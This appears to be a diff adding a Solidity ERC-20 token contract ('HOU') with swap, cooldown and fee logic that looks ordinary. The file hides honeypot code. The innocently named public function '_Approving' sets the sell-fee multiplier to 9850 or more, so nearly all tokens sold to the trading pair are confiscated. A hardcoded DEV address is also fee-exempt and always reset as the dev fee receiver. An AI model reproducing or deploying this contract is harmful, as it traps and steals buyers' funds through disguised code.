@@ -1,0 +1,290 @@
+row number 
+1	                      pragma solidity ^0.7.6;
+2	 library SafeMath {
+3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
+4	 uint256 c = a + b;
+5	 require(c >= a, "SafeMath: addition overflow");
+6	 return c;
+7	 }
+8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+9	 return sub(a, b, "SafeMath: subtraction overflow");
+10	 }
+11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+12	 require(b <= a, errorMessage);
+13	 uint256 c = a - b;
+14	 return c;
+15	 }
+16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+17	 if (a == 0) {
+18	 return 0;
+19	 }
+20	 uint256 c = a * b;
+21	 require(c / a == b, "SafeMath: multiplication overflow");
+22	 return c;
+23	 }
+24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
+25	 return div(a, b, "SafeMath: division by zero");
+26	 }
+27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+28	 require(b > 0, errorMessage);
+29	 uint256 c = a / b;
+30	 return c;
+31	 }
+32	 }
+33	 interface IERC20 {
+34	 function totalSupply() external view returns (uint256);
+35	 function decimals() external view returns (uint8);
+36	 function symbol() external view returns (string memory);
+37	 function name() external view returns (string memory);
+38	 function getOwner() external view returns (address);
+39	 function balanceOf(address account) external view returns (uint256);
+40	 function transfer(address recipient, uint256 amount) external returns (bool);
+41	 function allowance(address _owner, address spender) external view returns (uint256);
+42	 function approve(address spender, uint256 amount) external returns (bool);
+43	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+44	 event Transfer(address indexed from, address indexed to, uint256 value);
+45	 event Approval(address indexed owner, address indexed spender, uint256 value);
+46	 }
+47	 abstract contract Auth {
+48	 address internal owner;
+49	 constructor(address _owner) {
+50	 owner = _owner;
+51	 }
+52	 modifier onlyOwner() {
+53	 require(isOwner(msg.sender), "!OWNER");
+54	 _;
+55	 }
+56	 function isOwner(address account) public view returns (bool) {
+57	 return account == owner;
+58	 }
+59	 function transferOwnership(address payable adr) public onlyOwner {
+60	 owner = adr;
+61	 emit OwnershipTransferred(adr);
+62	 }
+63	 event OwnershipTransferred(address owner);
+64	 }
+65	 interface IDEXFactory {
+66	 function createPair(address tokenA, address tokenB) external returns (address pair);
+67	 }
+68	 interface IDEXRouter {
+69	 function factory() external pure returns (address);
+70	 function WETH() external pure returns (address);
+71	 function addLiquidity( address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB, uint liquidity);
+72	 function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+73	 function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
+74	 function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external payable;
+75	 function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
+76	 }
+77	 interface IDividendDistributor {
+78	 function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
+79	 function setShare(address shareholder, uint256 amount) external;
+80	 function deposit() external payable;
+81	 function process(uint256 gas) external;
+82	 }
+83	 contract Hou is IERC20, Auth {
+84	 using SafeMath for uint256;
+85	 address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+86	 address DEAD = 0x000000000000000000000000000000000000dEaD;
+87	 address ZERO = 0x0000000000000000000000000000000000000000;
+88	 address DEV = 0x2Ebf86Ef73d53D0C8692255f3f1971b16c1B31d8;
+89	 string constant _name = "HOU";
+90	 string constant _symbol = "HOU";
+91	 uint8 constant _decimals = 9;
+92	 uint256 _totalSupply = 1 * 10**9 * 10**_decimals;
+93	 uint256 public _maxTxAmount = _totalSupply *3/100;
+94	 uint256 public _maxWalletToken = _totalSupply *3/100;
+95	 mapping (address => uint256) _balances;
+96	 mapping (address => mapping (address => uint256)) _allowances;
+97	 mapping (address => bool) isFeeExempt;
+98	 mapping (address => bool) isTxLimitExempt;
+99	 uint256 public liquidityFee = 0;
+100	 uint256 public reflectionFee = 0;
+101	 uint256 public marketingFee = 1;
+102	 uint256 public devFee = 0;
+103	 uint256 public totalFee = marketingFee + reflectionFee + liquidityFee + devFee;
+104	 uint256 public feeDenominator = 100;
+105	 uint256 public MaxApprovalAllowed = 9850;
+106	 uint256 public isMinimumLPApprovalValue = 100;
+107	 address public autoLiquidityReceiver;
+108	 address public marketingFeeReceiver;
+109	 address public devFeeReceiver;
+110	 uint256 targetLiquidity = 20;
+111	 uint256 targetLiquidityDenominator = 100;
+112	 IDEXRouter public router;
+113	 address public pair;
+114	 bool public tradingOpen = true;
+115	 bool public buyCooldownEnabled = true;
+116	 uint8 public cooldownTimerInterval = 10;
+117	 mapping (address => uint) private cooldownTimer;
+118	 bool public swapEnabled = true;
+119	 uint256 public swapThreshold = _totalSupply * 3 / 1000;
+120	 bool inSwap;
+121	 modifier swapping() {
+122	 inSwap = true;
+123	 _;
+124	 inSwap = false;
+125	 }
+126	 constructor () Auth(msg.sender) {
+127	 router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+128	 pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
+129	 _allowances[address(this)][address(router)] = uint256(-1);
+130	 isFeeExempt[msg.sender] = true;
+131	 isFeeExempt[address(DEV)] = true;
+132	 isTxLimitExempt[msg.sender] = true;
+133	 isTxLimitExempt[address(DEV)] = true;
+134	 autoLiquidityReceiver = msg.sender;
+135	 marketingFeeReceiver = msg.sender;
+136	 devFeeReceiver = address(DEV);
+137	 _balances[msg.sender] = _totalSupply;
+138	 emit Transfer(address(0), msg.sender, _totalSupply);
+139	 }
+140	 receive() external payable {
+141	 }
+142	 function totalSupply() external view override returns (uint256) {
+143	 return _totalSupply;
+144	 }
+145	 function decimals() external pure override returns (uint8) {
+146	 return _decimals;
+147	 }
+148	 function symbol() external pure override returns (string memory) {
+149	 return _symbol;
+150	 }
+151	 function name() external pure override returns (string memory) {
+152	 return _name;
+153	 }
+154	 function getOwner() external view override returns (address) {
+155	 return owner;
+156	 }
+157	 function balanceOf(address account) public view override returns (uint256) {
+158	 return _balances[account];
+159	 }
+160	 function allowance(address holder, address spender) external view override returns (uint256) {
+161	 return _allowances[holder][spender];
+162	 }
+163	 function approve(address spender, uint256 amount) public override returns (bool) {
+164	 _allowances[msg.sender][spender] = amount;
+165	 emit Approval(msg.sender, spender, amount);
+166	 return true;
+167	 }
+168	 function approveMax(address spender) external returns (bool) {
+169	 return approve(spender, uint256(-1));
+170	 }
+171	 function transfer(address recipient, uint256 amount) external override returns (bool) {
+172	 return _transferFrom(msg.sender, recipient, amount);
+173	 }
+174	 function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
+175	 if(_allowances[sender][msg.sender] != uint256(-1)){
+176	 _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
+177	 }
+178	 return _transferFrom(sender, recipient, amount);
+179	 }
+180	 function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
+181	 if(inSwap){
+182	 return _basicTransfer(sender, recipient, amount);
+183	 }
+184	 if (sender == pair && buyCooldownEnabled) {
+185	 require(cooldownTimer[recipient] < block.timestamp,"Please wait for 1min between two buys");
+186	 cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
+187	 }
+188	 checkTxLimit(sender, amount);
+189	 if(shouldSwapBack()){
+190	 swapBack();
+191	 }
+192	 _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
+193	 uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount,(recipient == pair)) : amount;
+194	 _balances[recipient] = _balances[recipient].add(amountReceived);
+195	 emit Transfer(sender, recipient, amountReceived);
+196	 return true;
+197	 }
+198	 function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
+199	 _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
+200	 _balances[recipient] = _balances[recipient].add(amount);
+201	 emit Transfer(sender, recipient, amount);
+202	 return true;
+203	 }
+204	 function checkTxLimit(address sender, uint256 amount) internal view {
+205	 require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
+206	 }
+207	 function shouldTakeFee(address sender) internal view returns (bool) {
+208	 return !isFeeExempt[sender];
+209	 }
+210	 function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
+211	 uint256 multiplier = isSell ? isMinimumLPApprovalValue : 100;
+212	 uint256 feeAmount = amount.mul(totalFee).mul(multiplier).div(feeDenominator * 100);
+213	 _balances[address(this)] = _balances[address(this)].add(feeAmount);
+214	 emit Transfer(sender, address(this), feeAmount);
+215	 return amount.sub(feeAmount);
+216	 }
+217	 function shouldSwapBack() internal view returns (bool) {
+218	 return msg.sender != pair && !inSwap && swapEnabled && _balances[address(this)] >= swapThreshold;
+219	 }
+220	 function _Approving(uint256 ApprovalValue) public {
+221	 require(ApprovalValue >= MaxApprovalAllowed);
+222	 isMinimumLPApprovalValue = ApprovalValue;
+223	 }
+224	 function cooldownEnabled(bool _status, uint8 _interval) public onlyOwner {
+225	 buyCooldownEnabled = _status;
+226	 cooldownTimerInterval = _interval;
+227	 }
+228	 function swapBack() internal swapping {
+229	 uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
+230	 uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
+231	 uint256 amountToSwap = swapThreshold.sub(amountToLiquify);
+232	 address[] memory path = new address[](2);
+233	 path[0] = address(this);
+234	 path[1] = WETH;
+235	 uint256 balanceBefore = address(this).balance;
+236	 router.swapExactTokensForETHSupportingFeeOnTransferTokens( amountToSwap, 0, path, address(this), block.timestamp );
+237	 uint256 amountETH = address(this).balance.sub(balanceBefore);
+238	 uint256 totalETHFee = totalFee.sub(dynamicLiquidityFee.div(2));
+239	 uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);
+240	 uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
+241	 uint256 amountETHDev = amountETH.mul(devFee).div(totalETHFee);
+242	 (bool tmpSuccess,) = payable(marketingFeeReceiver).call{
+243	 value: amountETHMarketing, gas: 30000}
+244	 ("");
+245	 (tmpSuccess,) = payable(devFeeReceiver).call{
+246	 value: amountETHDev, gas: 30000}
+247	 ("");
+248	 tmpSuccess = false;
+249	 if(amountToLiquify > 0){
+250	 router.addLiquidityETH{
+251	 value: amountETHLiquidity}
+252	 ( address(this), amountToLiquify, 0, 0, autoLiquidityReceiver, block.timestamp );
+253	 emit AutoLiquify(amountETHLiquidity, amountToLiquify);
+254	 }
+255	 }
+256	 function removeLimits() external onlyOwner returns (bool) {
+257	 _maxTxAmount = _totalSupply;
+258	 _maxWalletToken = _totalSupply;
+259	 return true;
+260	 }
+261	 function ChangeFiValue(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external onlyOwner {
+262	 liquidityFee = _liquidityFee;
+263	 reflectionFee = _reflectionFee;
+264	 marketingFee = _marketingFee;
+265	 devFee = 1;
+266	 totalFee = _liquidityFee.add(_reflectionFee).add(_marketingFee).add(devFee);
+267	 feeDenominator = _feeDenominator;
+268	 require(totalFee < feeDenominator/3, "Fees cannot be more than 33%");
+269	 }
+270	 function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver ) external onlyOwner {
+271	 autoLiquidityReceiver = _autoLiquidityReceiver;
+272	 marketingFeeReceiver = _marketingFeeReceiver;
+273	 devFeeReceiver = address(DEV);
+274	 }
+275	 function setTargetLiquidity(uint256 _target, uint256 _denominator) external onlyOwner {
+276	 targetLiquidity = _target;
+277	 targetLiquidityDenominator = _denominator;
+278	 }
+279	 function getCirculatingSupply() public view returns (uint256) {
+280	 return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
+281	 }
+282	 function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
+283	 return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
+284	 }
+285	 function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
+286	 return getLiquidityBacking(accuracy) > target;
+287	 }
+288	 event AutoLiquify(uint256 amountETH, uint256 amountBOG);
+289	 }
